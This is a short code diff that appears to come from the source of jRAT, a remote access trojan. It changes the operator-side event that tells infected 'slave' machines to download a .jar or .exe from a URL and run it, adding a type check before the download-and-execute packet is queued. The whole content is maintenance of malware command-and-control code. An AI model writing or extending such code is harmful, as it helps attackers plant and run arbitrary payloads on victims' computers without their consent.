@@ -4,6 +4,7 @@ import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 
 import su.jrat.client.AbstractSlave;
+import su.jrat.client.Slave;
 import su.jrat.client.packets.outgoing.Packet17DownloadExecute;
 import su.jrat.client.utils.IconUtils;
 import su.jrat.client.utils.Utils;
@@ -24,7 +25,9 @@ public class DownloadAndExecEvent extends Event {
 	}
 
 	public void perform(AbstractSlave slave) {
-		slave.addToSendQueue(new Packet17DownloadExecute(url, jar ? ".jar" : ".exe"));
+		if (slave instanceof Slave) {
+			((Slave)slave).addToSendQueue(new Packet17DownloadExecute(url, jar ? ".jar" : ".exe"));
+		}
 	}
 
 	public String toString() {
